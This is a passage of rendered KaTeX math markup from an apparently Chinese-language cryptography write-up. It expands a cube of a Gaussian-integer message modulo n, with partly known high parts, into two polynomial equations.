stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}设m = a+bi\\所以就有如下式子:\\c \equiv m^3~mod(n)\\c \equiv (a+bi)^3~mod(n)\\c \equiv a^3-3ab^2+(3a^2b-b^3)i~mod(n)\\这时我们再设a = a_h+x,~~~b=b_h+y\\带入就会得到如下式子\\c \equiv (a_h+x)^3-3(a_h+x)(b_h+y)^2+[3(a_h+x)^2(b_h+y)-(b_h+y)^3~mod(n)\\实部对实部虚部对虚部就会有如下式子\\0 \equiv (a_h+x)^3-3(a_h+x)(b_h+y)^2-c_1~mod(n)\\0 \equiv 3(a_h+x)^2(b_h+y)-(b_h+y)^3-c_2~mod(n)\\记f_1 = (a_h+x)^3-3(a_h+x)(b_h+y)^2-c_1~mod(n)\\记f_2 = 3(a_h+x)^2(b_h+y)-(b_h+y)^3-c_2~mod(n)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:15.599999999999998em;vertical-align:-7.55em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:8.049999999999997em;"><span style="top:-10.209999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">设</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">i</span></span></span><span style="top:-9.009999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span><span style="top:-7.809999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-6.609999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">i</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-5.409999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">i</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-4.209999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">设</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3.009999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">带</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span></span></span><span style="top:-1.8099999999999967em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">[</span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-0.6099999999999974em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">虚</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">虚</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">子</span></span></span><span style="top:0.5900000000000019em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:1.7900000000000011em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:2.9900000000000007em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">记</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:4.1899999999999995em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">记</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 